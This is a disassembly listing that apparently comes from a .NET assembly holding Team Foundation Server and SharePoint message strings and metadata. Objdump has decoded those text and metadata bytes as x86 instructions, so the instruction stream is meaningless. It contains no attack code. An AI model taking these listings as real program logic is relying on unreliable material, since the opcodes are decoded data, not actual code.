  402d28:	and    BYTE PTR [eax+ebp*2+0x65],dh
  402d2c:	and    BYTE PTR [ebx+0x68],dl
  402d2f:	popa   
  402d30:	jb     0x402d97
  402d32:	push   eax
  402d33:	outs   dx,DWORD PTR ds:[esi]
  402d34:	imul   ebp,DWORD PTR [esi+0x74],0x74697320
  402d3b:	and    BYTE PTR gs:[esi+0x6f],ah
  402d3f:	jb     0x402d61
  402d41:	je     0x402dab
  402d43:	imul   esi,DWORD PTR [ebx+0x20],0x6a6f7270
  402d4a:	arpl   WORD PTR gs:[eax+eiz*1+0x28],si
  402d4f:	jnp    0x402d81
  402d51:	jge    0x402d82
  402d53:	jnp    0x402d86
  402d55:	jge    0x402d80
  402d57:	aas    
  402d58:	add    eax,eax
  402d5a:	add    dl,BYTE PTR [esi+eax*2+0x32]
  402d5e:	cmp    BYTE PTR ss:[eax],dh
  402d61:	xor    BYTE PTR [eax],dh
  402d63:	cmp    ah,BYTE PTR [eax]
  402d65:	push   esp
  402d66:	push   0x6f662065
  402d6b:	ins    BYTE PTR es:[edi],dx
  402d6c:	ins    BYTE PTR es:[edi],dx
  402d6d:	outs   dx,DWORD PTR ds:[esi]
  402d6e:	ja     0x402dd9
  402d70:	outs   dx,BYTE PTR ds:[esi]
  402d71:	and    BYTE PTR [di+0x52],dl
  402d75:	dec    esp
  402d76:	and    BYTE PTR [edi+0x72],ch
  402d79:	and    BYTE PTR [ebx+0x65],dh
  402d7c:	jb     0x402df4
  402d7e:	gs jb  0x402da1
  402d81:	outs   dx,BYTE PTR ds:[esi]
  402d82:	popa   
  402d83:	ins    DWORD PTR es:[edi],dx
  402d84:	and    BYTE PTR gs:[ebx+0x61],ah
  402d88:	outs   dx,BYTE PTR ds:[esi]
  402d89:	outs   dx,BYTE PTR ds:[esi]
  402d8a:	outs   dx,DWORD PTR ds:[esi]
  402d8b:	je     0x402dad
  402d8d:	bound  esp,QWORD PTR [ebp+0x20]
  402d90:	jb     0x402df7
  402d92:	jae    0x402e03
  402d94:	ins    BYTE PTR es:[edi],dx
  402d95:	jbe    0x402dfc
  402d97:	and    BYTE PTR fs:[edi+ebp*2+0x20],dh
  402d9c:	popa   
  402d9d:	and    BYTE PTR [ebx+0x65],dh
  402da0:	jb     0x402e18
  402da2:	gs jb  0x402dc5
  402da5:	je     0x402e0f
  402da7:	popa   
  402da8:	je     0x402dca
  402daa:	imul   esi,DWORD PTR [ebx+0x20],0x6e6e7572
  402db1:	imul   ebp,DWORD PTR [esi+0x67],0x65540a0d
  402db8:	popa   
  402db9:	ins    DWORD PTR es:[edi],dx
  402dba:	and    BYTE PTR [esi+0x6f],al
  402dbd:	jne    0x402e2d
  402dbf:	fs popa 
  402dc1:	je     0x402e2c
  402dc3:	outs   dx,DWORD PTR ds:[esi]
  402dc4:	outs   dx,BYTE PTR ds:[esi]
  402dc5:	and    BYTE PTR [ebx+0x65],dl
  402dc8:	jb     0x402e40
  402dca:	gs jb  0x402e07
  402dcd:	and    BYTE PTR [ebx+0x30],bh
  402dd0:	jge    0x402e00
  402dd2:	and    BYTE PTR ds:0x490a0d0a,cl
  402dd8:	data16 and BYTE PTR [ecx+0x6f],bh
  402ddc:	jne    0x402dfe
  402dde:	je     0x402e59
  402de0:	jo     0x402e47
  402de2:	and    BYTE PTR [ecx+0x20],ah
  402de5:	jae    0x402e4c
  402de7:	jb     0x402e5f
  402de9:	gs jb  0x402e0c
  402dec:	outs   dx,BYTE PTR ds:[esi]
  402ded:	popa   
  402dee:	ins    DWORD PTR es:[edi],dx
  402def:	gs sub al,0x20
  402df2:	imul   esi,DWORD PTR [eax+eiz*1+0x6d],0x20747375
  402dfa:	ins    DWORD PTR es:[edi],dx
  402dfb:	popa   
  402dfc:	je     0x402e61
  402dfe:	push   0x65687420
  402e03:	and    BYTE PTR [esi+0x61],ch
  402e06:	ins    DWORD PTR es:[edi],dx
  402e07:	and    BYTE PTR gs:[ecx+0x6f],bh
  402e0b:	jne    0x402e2d
  402e0d:	je     0x402e88
  402e0f:	jo     0x402e76
  402e11:	and    BYTE PTR fs:[ecx+0x6e],ch
  402e15:	and    BYTE PTR [eax+ebp*2+0x65],dh
  402e19:	and    BYTE PTR ds:0x6464410a,cl
  402e1f:	and    BYTE PTR [ebp+eiz*2+0x61],dl
  402e23:	ins    DWORD PTR es:[edi],dx
  402e24:	and    BYTE PTR [esi+0x6f],al
  402e27:	jne    0x402e97
  402e29:	fs popa 
  402e2b:	je     0x402e96
  402e2d:	outs   dx,DWORD PTR ds:[esi]
  402e2e:	outs   dx,BYTE PTR ds:[esi]
  402e2f:	and    BYTE PTR [ebx+0x65],dl
  402e32:	jb     0x402eaa
  402e34:	gs jb  0x402e57
  402e37:	imul   esp,DWORD PTR fs:[ecx+0x6c],0x202e676f
  402e3f:	dec    ecx
  402e40:	data16 and BYTE PTR [ecx+0x6f],bh
  402e44:	jne    0x402e66
  402e46:	je     0x402ec1
  402e48:	jo     0x402eaf
  402e4a:	and    BYTE PTR [ecx+0x20],ah
  402e4d:	push   ebp
  402e4e:	push   edx
  402e4f:	dec    ecx
  402e50:	sub    al,0x20
  402e52:	imul   esi,DWORD PTR [eax+eiz*1+0x6d],0x20747375
  402e5a:	jne    0x402ecf
  402e5c:	and    BYTE PTR gs:0x6568740a,cl
  402e63:	and    BYTE PTR [esi+0x6f],ah
  402e66:	ins    BYTE PTR es:[edi],dx
  402e67:	ins    BYTE PTR es:[edi],dx
  402e68:	outs   dx,DWORD PTR ds:[esi]
  402e69:	ja     0x402ed4
  402e6b:	outs   dx,BYTE PTR ds:[esi]
  402e6c:	and    BYTE PTR [bp+di+0x79],dh
  402e70:	outs   dx,BYTE PTR ds:[esi]
  402e71:	je     0x402ed4
  402e73:	js     0x402eaf
  402e75:	and    BYTE PTR [eax+0x74],ch
  402e78:	je     0x402eea
  402e7a:	pop    ebx
  402e7b:	jae    0x402eda
  402e7d:	cmp    ch,BYTE PTR [edi]
  402e7f:	das    
  402e80:	cmp    al,0x73
  402e82:	gs jb  0x402efb
  402e85:	gs jb  0x402ea8
  402e88:	outs   dx,BYTE PTR ds:[esi]
  402e89:	popa   
  402e8a:	ins    DWORD PTR es:[edi],dx
  402e8b:	gs cmp bh,BYTE PTR ds:[ebx+esi*2]
  402e90:	gs jb  0x402f09
  402e93:	gs jb  0x402eb6
  402e96:	jo     0x402f07
  402e98:	jb     0x402f0e
  402e9a:	add    DWORD PTR ds:[ecx],eax
  402e9d:	dec    esi
  402e9e:	add    DWORD PTR [esi],edi
  402ea0:	push   esp
  402ea1:	push   0x307b2065
  402ea6:	jge    0x402ec8
  402ea8:	outs   dx,DWORD PTR ds:[esi]
  402ea9:	jo     0x402f1f
  402eab:	imul   ebp,DWORD PTR [edi+0x6e],0x20736920
  402eb2:	outs   dx,BYTE PTR ds:[esi]
  402eb3:	outs   dx,DWORD PTR ds:[esi]
  402eb4:	and    BYTE PTR [edi+ebp*2+0x6e],ch
  402eb8:	addr16 gs jb 0x402edc
  402ebc:	jae    0x402f33
  402ebe:	jo     0x402f30
  402ec0:	outs   dx,DWORD PTR ds:[esi]
  402ec1:	jb     0x402f37
  402ec3:	gs fs and BYTE PTR cs:[eax+0x6c],dl
  402ec9:	gs popa 
  402ecb:	jae    0x402f32
  402ecd:	and    BYTE PTR [ebp+0x73],dh
  402ed0:	and    BYTE PTR gs:[ebx+0x31],bh
  402ed4:	jge    0x402ef6
  402ed6:	imul   ebp,DWORD PTR [esi+0x73],0x64616574
  402edd:	add    DWORD PTR cs:[ecx],ebx
  402ee0:	push   ebp
  402ee1:	outs   dx,BYTE PTR ds:[esi]
  402ee2:	jb     0x402f49
  402ee4:	arpl   WORD PTR [edi+0x67],bp
  402ee7:	outs   dx,BYTE PTR ds:[esi]
  402ee8:	imul   edi,DWORD PTR [edx+0x65],0x706f2064
  402eef:	je     0x402f5a
  402ef1:	outs   dx,DWORD PTR ds:[esi]
  402ef2:	outs   dx,BYTE PTR ds:[esi]
  402ef3:	and    BYTE PTR [edi],ah
  402ef5:	jnp    0x402f27
  402ef7:	jge    0x402f20
  402ef9:	add    DWORD PTR [ecx+0x55],ebx
  402efc:	jae    0x402f5f
  402efe:	cmp    ah,BYTE PTR gs:[bx+si]
  402f02:	push   esp
  402f03:	data16 jae 0x402f4a
  402f06:	gs ins BYTE PTR es:[edi],dx
  402f08:	gs je  0x402f70
  402f0b:	push   eax
  402f0c:	jb     0x402f7d
  402f0e:	push   0x65
  402f10:	arpl   WORD PTR [eax+eiz*1+0x5b],si
  402f14:	das    
  402f15:	jno    0x402f74
  402f17:	and    BYTE PTR [ebx+0x2f],bl
  402f1a:	outs   dx,WORD PTR ds:[esi]
  402f1c:	jb     0x402f81
  402f1e:	gs pop ebp
  402f20:	and    BYTE PTR [ebx+0x2f],bl
  402f23:	gs js  0x402f89
  402f26:	ins    BYTE PTR es:[edi],dx
  402f27:	jne    0x402f8d
  402f29:	gs ja  0x402f9f
  402f2c:	jae    0x402f8b
  402f2e:	and    BYTE PTR [edi],ch
  402f30:	arpl   WORD PTR [edi+0x6c],bp
  402f33:	ins    BYTE PTR es:[edi],dx
  402f34:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  402f39:	outs   dx,BYTE PTR ds:[esi]
  402f3a:	cmp    bh,BYTE PTR [esi*2+0x203e6c72]
  402f41:	cmp    al,0x74
  402f43:	gs popa 
  402f45:	ins    DWORD PTR es:[edi],dx
  402f46:	and    BYTE PTR [eax+0x72],dh
  402f49:	outs   dx,DWORD PTR ds:[esi]
  402f4a:	push   0x65
  402f4c:	arpl   WORD PTR [eax+eiz*1+0x6e],si
  402f50:	popa   
  402f51:	ins    DWORD PTR es:[edi],dx
  402f52:	gs ds add edx,eax
  402f56:	add    al,BYTE PTR [ebp+eiz*2+0x6c]
  402f5a:	gs je  0x402fc2
  402f5d:	jae    0x402f7f
  402f5f:	je     0x402fc9
  402f61:	and    BYTE PTR gs:[ebp+eiz*2+0x61],dl
  402f66:	ins    DWORD PTR es:[edi],dx
  402f67:	and    BYTE PTR [eax+0x72],dl
  402f6a:	outs   dx,DWORD PTR ds:[esi]
  402f6b:	push   0x65
  402f6d:	arpl   WORD PTR [eax+eiz*1+0x66],si
  402f71:	jb     0x402fe2
  402f73:	ins    DWORD PTR es:[edi],dx
  402f74:	and    BYTE PTR [ebp+eiz*2+0x61],dl
  402f78:	ins    DWORD PTR es:[edi],dx
  402f79:	and    BYTE PTR [esi+0x6f],al
  402f7c:	jne    0x402fec
  402f7e:	fs popa 
  402f80:	je     0x402feb
  402f82:	outs   dx,DWORD PTR ds:[esi]
  402f83:	outs   dx,BYTE PTR ds:[esi]
  402f84:	and    BYTE PTR cs:[edi+ebp*2+0x20],dl
  402f89:	jne    0x402ffe
  402f8b:	and    BYTE PTR gs:[eax+ebp*2+0x69],dh
  402f90:	jae    0x402fb2
  402f92:	arpl   WORD PTR [edi+0x6d],bp
  402f95:	ins    DWORD PTR es:[edi],dx
  402f96:	popa   
  402f97:	outs   dx,BYTE PTR ds:[esi]
  402f98:	fs sub al,0x20
  402f9b:	jns    0x40300c
  402f9d:	jne    0x402fbf
  402f9f:	ins    DWORD PTR es:[edi],dx
  402fa0:	jne    0x403015
  402fa2:	je     0x402fc4
  402fa4:	bound  esp,QWORD PTR [ebp+0x20]
  402fa7:	popa   
  402fa8:	and    BYTE PTR [ebp+0x65],ch
  402fab:	ins    DWORD PTR es:[edi],dx
  402fac:	bound  esp,QWORD PTR [ebp+0x72]
  402faf:	and    BYTE PTR [edi+0x66],ch
  402fb2:	and    BYTE PTR [ebp+0x69],ah
  402fb5:	je     0x40301f
  402fb7:	gs jb  0x402fda
  402fba:	je     0x403024
  402fbc:	and    BYTE PTR gs:[ebp+eiz*2+0x61],dl
  402fc1:	ins    DWORD PTR es:[edi],dx
  402fc2:	and    BYTE PTR [esi+0x6f],al
  402fc5:	jne    0x403035
  402fc7:	fs popa 
  402fc9:	je     0x403034
  402fcb:	outs   dx,DWORD PTR ds:[esi]
  402fcc:	outs   dx,BYTE PTR ds:[esi]
  402fcd:	and    BYTE PTR [ebx+0x65],dl
  402fd0:	jb     0x403048
  402fd2:	gs jb  0x402ff5
  402fd5:	inc    ecx
  402fd6:	fs ins DWORD PTR es:[edi],dx
  402fd8:	imul   ebp,DWORD PTR [esi+0x69],0x61727473
  402fdf:	je     0x403050
  402fe1:	jb     0x403056
  402fe3:	and    BYTE PTR [edi+0x72],ah
  402fe6:	outs   dx,DWORD PTR ds:[esi]
  402fe7:	jne    0x403059
  402fe9:	and    BYTE PTR [edi+0x72],ch
  402fec:	and    BYTE PTR [ecx+0x20],ah
  402fef:	ins    DWORD PTR es:[edi],dx
  402ff0:	gs ins DWORD PTR es:[edi],dx
  402ff2:	bound  esp,QWORD PTR [ebp+0x72]
  402ff5:	and    BYTE PTR [edi+0x66],ch
  402ff8:	and    BYTE PTR [eax+ebp*2+0x65],dh
  402ffc:	and    BYTE PTR [eax+0x72],dl
  402fff:	outs   dx,DWORD PTR ds:[esi]
  403000:	push   0x65
  403002:	arpl   WORD PTR [eax+eiz*1+0x41],si
  403006:	fs ins DWORD PTR es:[edi],dx
  403008:	imul   ebp,DWORD PTR [esi+0x69],0x61727473
  40300f:	je     0x403080
  403011:	jb     0x403086
  403013:	and    BYTE PTR [edi+0x72],ah
  403016:	outs   dx,DWORD PTR ds:[esi]
  403017:	jne    0x403089
  403019:	and    BYTE PTR [esi+0x6f],ah
  40301c:	jb     0x40303e
  40301e:	je     0x403088
  403020:	and    BYTE PTR gs:[eax+0x72],dh
  403024:	outs   dx,DWORD PTR ds:[esi]
  403025:	push   0x65
  403027:	arpl   WORD PTR [eax+eiz*1+0x79],si
  40302b:	outs   dx,DWORD PTR ds:[esi]
  40302c:	jne    0x40304e
  40302e:	popa   
  40302f:	jb     0x403096
  403031:	and    BYTE PTR [ebp+eiz*2+0x6c],ah
  403035:	gs je  0x4030a1
  403038:	outs   dx,BYTE PTR ds:[esi]
  403039:	and    BYTE PTR cs:[di+0x73],dl
  40303e:	and    BYTE PTR gs:[eax+ebp*2+0x69],dh
  403043:	jae    0x403065
  403045:	arpl   WORD PTR [edi+0x6d],bp
  403048:	ins    DWORD PTR es:[edi],dx
  403049:	popa   
  40304a:	outs   dx,BYTE PTR ds:[esi]
  40304b:	and    BYTE PTR fs:[edi+0x69],dh
  40304f:	je     0x4030b9
  403051:	and    BYTE PTR [ebx+0x61],ah
  403054:	jne    0x4030ca
  403056:	imul   ebp,DWORD PTR [edi+0x6e],0x63656220
  40305d:	popa   
  40305e:	jne    0x4030d3
  403060:	and    BYTE PTR gs:[ecx+0x66],ah
  403064:	je     0x4030cb
  403066:	jb     0x403088
  403068:	fs gs ins BYTE PTR es:[edi],dx
  40306b:	gs je  0x4030d7
  40306e:	outs   dx,BYTE PTR ds:[esi]
  40306f:	and    BYTE PTR [si+0x68],dh
  403073:	and    BYTE PTR gs:[ebp+eiz*2+0x61],dh
  403078:	ins    DWORD PTR es:[edi],dx
  403079:	and    BYTE PTR [eax+0x72],dh
  40307c:	outs   dx,DWORD PTR ds:[esi]
  40307d:	push   0x65
  40307f:	arpl   WORD PTR [eax+eiz*1+0x69],si
  403083:	je     0x4030a5
  403085:	arpl   WORD PTR [ecx+0x6e],sp
  403088:	outs   dx,BYTE PTR ds:[esi]
  403089:	outs   dx,DWORD PTR ds:[esi]
  40308a:	je     0x4030ac
  40308c:	bound  esp,QWORD PTR [ebp+0x20]
  40308f:	jb     0x4030f6
  403091:	arpl   WORD PTR [edi+0x76],bp
  403094:	gs jb  0x4030fc
  403097:	fs add DWORD PTR cs:[edx+0x20202001],esi
  40309f:	pop    ebx
  4030a0:	das    
  4030a1:	gs js  0x403107
  4030a4:	ins    BYTE PTR es:[edi],dx
  4030a5:	jne    0x40310b
  4030a7:	gs ja  0x40311d
  4030aa:	jae    0x403109
  4030ac:	and    BYTE PTR ds:0x63784520,ch
  4030b2:	ins    BYTE PTR es:[edi],dx
  4030b3:	jne    0x403119
  4030b5:	and    BYTE PTR gs:[eax+ebp*2+0x65],dh
  4030ba:	and    BYTE PTR [eax+0x72],dh
  4030bd:	outs   dx,DWORD PTR ds:[esi]
  4030be:	push   0x65
  4030c0:	arpl   WORD PTR [edi+eiz*1+0x73],si
  4030c4:	and    BYTE PTR [ebx+0x68],dl
  4030c7:	popa   
  4030c8:	jb     0x40312f
  4030ca:	push   eax
  4030cb:	outs   dx,DWORD PTR ds:[esi]
  4030cc:	imul   ebp,DWORD PTR [esi+0x74],0x74697320
  4030d3:	and    BYTE PTR gs:[edi+0x68],dh
  4030d7:	outs   dx,BYTE PTR gs:[esi]
  4030d9:	and    BYTE PTR [ebp+eiz*2+0x6c],ah
  4030dd:	gs je  0x403149
  4030e0:	outs   dx,BYTE PTR ds:[esi]
  4030e1:	and    BYTE PTR [si+0x68],dh
  4030e5:	and    BYTE PTR gs:[eax+0x72],dh
  4030e9:	outs   dx,DWORD PTR ds:[esi]
  4030ea:	push   0x65
  4030ec:	arpl   WORD PTR [esi+ebp*1+0x20],si
  4030f0:	push   esp
  4030f1:	push   0x6f207369
  4030f6:	jo     0x40316c
  4030f8:	imul   ebp,DWORD PTR [edi+0x6e],0x6c697720
  4030ff:	ins    BYTE PTR es:[edi],dx
  403100:	and    BYTE PTR [ebp+eiz*2+0x61],ch
  403104:	jbe    0x40316b
  403106:	and    BYTE PTR [ebx+0x69],dh
  403109:	je     0x403170
  40310b:	and    BYTE PTR [ecx+0x6e],ch
  40310e:	je     0x403171
  403110:	arpl   WORD PTR [eax+eiz*1+0x73],si
  403114:	outs   dx,DWORD PTR ds:[esi]
  403115:	and    BYTE PTR [eax+ebp*2+0x61],dh
  403119:	je     0x40313b
  40311b:	imul   esi,DWORD PTR [eax+eiz*1+0x72],0x69616d65
  403123:	outs   dx,BYTE PTR ds:[esi]
  403124:	jae    0x403146
  403126:	outs   dx,WORD PTR ds:[esi]
  403128:	jb     0x40314a
  40312a:	outs   dx,DWORD PTR ds:[esi]
  40312b:	je     0x403195
  40312d:	gs jb  0x403150
  403130:	jo     0x4031a4
  403132:	outs   dx,DWORD PTR ds:[esi]
  403133:	push   0x65
  403135:	arpl   WORD PTR [ebx+esi*2+0x20],si
  403139:	je     0x4031a3
  40313b:	popa   
  40313c:	je     0x40315e
  40313e:	ins    DWORD PTR es:[edi],dx
  40313f:	popa   
  403140:	jns    0x403162
  403142:	bound  esp,QWORD PTR [ebp+0x20]
  403145:	jne    0x4031ba
  403147:	imul   ebp,DWORD PTR [esi+0x67],0x2e746920
  40314e:	add    DWORD PTR [ebx],edi
  403150:	and    BYTE PTR [eax],ah
  403152:	and    BYTE PTR [ebx+0x2f],bl
  403155:	outs   dx,WORD PTR ds:[esi]
  403157:	jb     0x4031bc
  403159:	gs pop ebp
  40315b:	and    BYTE PTR ds:0x6e6f4320,ch
  403161:	je     0x4031cc
  403163:	outs   dx,BYTE PTR ds:[esi]
  403164:	jne    0x4031cb
  403166:	and    BYTE PTR [ebp+0x76],ah
  403169:	outs   dx,BYTE PTR gs:[esi]
  40316b:	and    BYTE PTR [ecx+0x66],ch
  40316e:	and    BYTE PTR [ebx+0x6f],dh
  403171:	ins    DWORD PTR es:[edi],dx
  403172:	and    BYTE PTR gs:[ecx+eiz*2+0x74],ah
  403177:	popa   
  403178:	and    BYTE PTR [ebx+0x61],ah
  40317b:	outs   dx,BYTE PTR ds:[esi]
  40317c:	outs   dx,BYTE PTR ds:[esi]
  40317d:	outs   dx,DWORD PTR ds:[esi]
  40317e:	je     0x4031a0
  403180:	bound  esp,QWORD PTR [ebp+0x20]
  403183:	fs gs ins BYTE PTR es:[edi],dx
  403186:	gs je  0x4031ee
  403189:	fs add DWORD PTR cs:0x2f202020,edi
  403191:	arpl   WORD PTR [edi+0x6c],bp
  403194:	ins    BYTE PTR es:[edi],dx
  403195:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  40319a:	outs   dx,BYTE PTR ds:[esi]
  40319b:	cmp    bh,BYTE PTR [esi*2+0x203e6c72]
  4031a2:	sub    eax,0x65685420
  4031a7:	and    BYTE PTR [ebp+0x72],dh
  4031aa:	ins    BYTE PTR es:[edi],dx
  4031ab:	and    BYTE PTR [esi+0x6f],ah
  4031ae:	jb     0x4031d0
  4031b0:	popa   
  4031b1:	and    BYTE PTR [ebp+eiz*2+0x61],dl
  4031b5:	ins    DWORD PTR es:[edi],dx
  4031b6:	and    BYTE PTR [eax+0x72],dl
  4031b9:	outs   dx,DWORD PTR ds:[esi]
  4031ba:	push   0x65
  4031bc:	arpl   WORD PTR [eax+eiz*1+0x43],si
  4031c0:	outs   dx,DWORD PTR ds:[esi]
  4031c1:	ins    BYTE PTR es:[edi],dx
  4031c2:	ins    BYTE PTR es:[edi],dx
  4031c3:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  4031c8:	outs   dx,BYTE PTR ds:[esi]
  4031c9:	add    DWORD PTR cs:[ebp+0x20],ebx
  4031cd:	and    BYTE PTR [eax],ah
  4031cf:	cmp    al,0x74
  4031d1:	gs popa 
  4031d3:	ins    DWORD PTR es:[edi],dx
  4031d4:	and    BYTE PTR [eax+0x72],dh
  4031d7:	outs   dx,DWORD PTR ds:[esi]
  4031d8:	push   0x65
  4031da:	arpl   WORD PTR [eax+eiz*1+0x6e],si
  4031de:	popa   
  4031df:	ins    DWORD PTR es:[edi],dx
  4031e0:	gs and BYTE PTR ds:0x65685420,ch
  4031e8:	and    BYTE PTR [esi+0x61],ch
  4031eb:	ins    DWORD PTR es:[edi],dx
  4031ec:	and    BYTE PTR gs:[edi+0x66],ch
  4031f0:	and    BYTE PTR [eax+ebp*2+0x65],dh
  4031f4:	and    BYTE PTR [eax+0x72],dh
  4031f7:	outs   dx,DWORD PTR ds:[esi]
  4031f8:	push   0x65
  4031fa:	arpl   WORD PTR [esi+ebp*1+0x20],si
  4031fe:	push   ebp
  4031ff:	jae    0x403266
  403201:	and    BYTE PTR [ecx+0x75],dh
  403204:	outs   dx,DWORD PTR ds:[esi]
  403205:	je     0x40326c
  403207:	jae    0x403229
  403209:	imul   esp,DWORD PTR [esi+0x20],0x72656874
  403210:	and    BYTE PTR gs:[ecx+0x72],ah
  403214:	and    BYTE PTR gs:[ebx+0x70],dh
  403218:	popa   
  403219:	arpl   WORD PTR [ebp+0x73],sp
  40321c:	and    BYTE PTR [ecx+0x6e],ch
  40321f:	and    BYTE PTR [eax+ebp*2+0x65],dh
  403223:	and    BYTE PTR [esi+0x61],ch
  403226:	ins    DWORD PTR es:[edi],dx
  403227:	gs add DWORD PTR cs:[ecx],ebp
  40322b:	and    BYTE PTR [eax],ah
  40322d:	and    BYTE PTR [ebx+0x2f],bl
  403230:	jno    0x40328f
  403232:	and    BYTE PTR ds:0x206f4420,ch
  403238:	outs   dx,BYTE PTR ds:[esi]
  403239:	outs   dx,DWORD PTR ds:[esi]
  40323a:	je     0x40325c
  40323c:	jo     0x4032b0
  40323e:	outs   dx,DWORD PTR ds:[esi]
  40323f:	ins    DWORD PTR es:[edi],dx
  403240:	jo     0x4032b6
  403242:	and    BYTE PTR [esi+0x6f],ah
  403245:	jb     0x403267
  403247:	arpl   WORD PTR [edi+0x6e],bp
  40324a:	imul   si,WORD PTR [edx+0x6d],0x7461
  403250:	imul   ebp,DWORD PTR [edi+0x6e],0x5901012e
  403257:	add    BYTE PTR [edx+0x53],al
  40325a:	dec    edx
  40325b:	inc    edx
  40325c:	add    DWORD PTR [eax],eax
  40325e:	add    DWORD PTR [eax],eax
  403260:	add    BYTE PTR [eax],al
  403262:	add    BYTE PTR [eax],al
  403264:	or     al,0x0
  403266:	add    BYTE PTR [eax],al
  403268:	jbe    0x40329e
  40326a:	xor    BYTE PTR cs:[esi],ch
  40326d:	xor    esi,DWORD PTR [eax]
  40326f:	xor    esi,DWORD PTR [ecx]
  403271:	cmp    DWORD PTR [eax],eax
  403273:	add    BYTE PTR [eax],al
  403275:	add    BYTE PTR ds:0x6c00,al
  40327b:	add    BYTE PTR [edi+eax*1+0x0],cl
  40327f:	add    BYTE PTR [ebx],ah
  403281:	jle    0x403283
  403283:	add    BYTE PTR [eax+0x54000007],bh
  403289:	or     eax,DWORD PTR [eax]
  40328b:	add    BYTE PTR [ebx],ah
  40328d:	push   ebx
  40328e:	je     0x403302
  403290:	imul   ebp,DWORD PTR [esi+0x67],0x73
  403297:	add    BYTE PTR [ebx+edx*1],cl
  40329a:	add    BYTE PTR [eax],al
  40329c:	xor    al,0x2
  40329e:	add    BYTE PTR [eax],al
  4032a0:	and    edx,DWORD PTR [ebp+0x53]
  4032a3:	add    BYTE PTR [eax+0x15],al
  4032a6:	add    BYTE PTR [eax],al
  4032a8:	adc    BYTE PTR [eax],al
  4032aa:	add    BYTE PTR [eax],al
  4032ac:	and    eax,DWORD PTR [edi+0x55]
  4032af:	dec    ecx
  4032b0:	inc    esp
  4032b1:	add    BYTE PTR [eax],al
  4032b3:	add    BYTE PTR [eax+0x15],dl
  4032b6:	add    BYTE PTR [eax],al
  4032b8:	or     BYTE PTR [edi],al
  4032ba:	add    BYTE PTR [eax],al
  4032bc:	and    eax,DWORD PTR [edx+0x6c]
  4032bf:	outs   dx,DWORD PTR ds:[esi]
  4032c0:	bound  eax,QWORD PTR [eax]
  4032c2:	add    BYTE PTR [eax],al
  4032c4:	add    BYTE PTR [eax],al
  4032c6:	add    BYTE PTR [eax],al
  4032c8:	add    al,BYTE PTR [eax]
  4032ca:	add    BYTE PTR [ecx],al
  4032cc:	push   edi
  4032cd:	adc    eax,0x10909a2
  4032d2:	add    BYTE PTR [eax],al
  4032d4:	add    dl,bh
  4032d6:	and    eax,0x160033
  4032db:	add    BYTE PTR [ecx],al
  4032dd:	add    BYTE PTR [eax],al
  4032df:	add    BYTE PTR [eax+eax*1],dh
  4032e2:	add    BYTE PTR [eax],al
  4032e4:	add    al,0x0
  4032e6:	add    BYTE PTR [eax],al
  4032e8:	or     BYTE PTR [eax],al
  4032ea:	add    BYTE PTR [eax],al
  4032ec:	sbb    DWORD PTR [eax],eax
  4032ee:	add    BYTE PTR [eax],al
  4032f0:	add    eax,0x4a000000
  4032f5:	add    BYTE PTR [eax],al
  4032f7:	add    BYTE PTR [ecx],bl
  4032f9:	add    BYTE PTR [eax],al
  4032fb:	add    BYTE PTR [ebx],al
  4032fd:	add    BYTE PTR [eax],al
  4032ff:	add    BYTE PTR [ecx],al
  403301:	add    BYTE PTR [eax],al
  403303:	add    BYTE PTR [ecx],dl
  403305:	add    BYTE PTR [eax],al
  403307:	add    BYTE PTR [edx],dl
  403309:	add    BYTE PTR [eax],al
  40330b:	add    BYTE PTR [ecx],al
  40330d:	add    BYTE PTR [eax],al
  40330f:	add    BYTE PTR [ecx],al
  403311:	add    BYTE PTR [eax],al
  403313:	add    BYTE PTR [esi],al
  403315:	add    BYTE PTR [eax],al
  403317:	add    BYTE PTR [ecx],al
  403319:	add    BYTE PTR [eax],al
  40331b:	add    BYTE PTR [eax],al
  40331d:	add    BYTE PTR [edx],cl
  40331f:	add    BYTE PTR [ecx],al
  403321:	add    BYTE PTR [eax],al
  403323:	add    BYTE PTR [eax],al
  403325:	add    BYTE PTR [esi],al
  403327:	add    BYTE PTR [ecx+0x0],dh
  40332a:	push   0x0
  40332c:	or     al,BYTE PTR [eax]
  40332e:	(bad)  
  40332f:	add    BYTE PTR [edi],dh
  403331:	add    BYTE PTR [ebx],cl
  403333:	add    cl,ch
  403335:	add    BYTE PTR [eax],al
  403337:	add    BYTE PTR [esi],al
  403339:	add    BYTE PTR ds:0x6011c01,ch
  40333f:	add    BYTE PTR [esi+0x1],bl
  403342:	dec    ecx
  403343:	add    DWORD PTR [esi],eax
  403345:	add    BYTE PTR [esi+0x6039c03],dh
  40334b:	add    dh,ch
  40334d:	add    ecx,edi
  40334f:	add    eax,DWORD PTR [esi]
  403351:	add    BYTE PTR [edx],al
  403353:	add    al,0x6a
  403355:	add    BYTE PTR [esi],al
  403357:	add    BYTE PTR [edx],ch
  403359:	add    al,0x18
  40335b:	add    al,0x6
  40335d:	add    BYTE PTR [ecx+0x4],al
  403360:	sbb    BYTE PTR [esi+eax*1],al
  403363:	add    BYTE PTR [esi+0x4],bl
  403366:	sbb    BYTE PTR [esi+eax*1],al
  403369:	add    BYTE PTR [esp+eax*1+0x18],bh
  40336d:	add    al,0x6
  40336f:	add    BYTE PTR [ebp+0x6041804],dl
  403375:	add    BYTE PTR [esi+0x6041804],ch
  40337b:	add    cl,cl
  40337d:	add    al,0x18
  40337f:	add    al,0x6
  403381:	add    dl,ah
  403383:	add    al,0x18
  403385:	add    al,0x6
  403387:	add    bh,bh
  403389:	add    al,0x18
  40338b:	add    al,0x6
  40338d:	add    BYTE PTR ds:0x6011c05,ah
  403393:	add    BYTE PTR [edi+0x5],al
  403396:	sbb    al,0x1
  403398:	push   es
  403399:	add    BYTE PTR [ecx+0x5],ch
  40339c:	sbb    BYTE PTR [esi+eax*1],al
  40339f:	add    BYTE PTR [ebp+eax*1+0x60418],al
  4033a6:	popf   
  4033a7:	add    eax,0x60418
  4033ac:	fild   DWORD PTR ds:0x605bb
  4033b2:	or     al,0x6
  4033b4:	stc    
  4033b5:	add    eax,0x6200063
  4033ba:	add    BYTE PTR [eax],al
  4033bc:	push   es
  4033bd:	add    BYTE PTR [edi],ch
  4033bf:	push   es
  4033c0:	mov    ebx,0x71000605
  4033c5:	push   es
  4033c6:	pusha  
  4033c7:	push   es
  4033c8:	push   es
  4033c9:	add    al,dl
  4033cb:	push   es
  4033cc:	push   0x0
  4033ce:	push   es
  4033cf:	add    ah,ah
  4033d1:	push   es
  4033d2:	fadd   DWORD PTR [esi]
  4033d4:	push   es
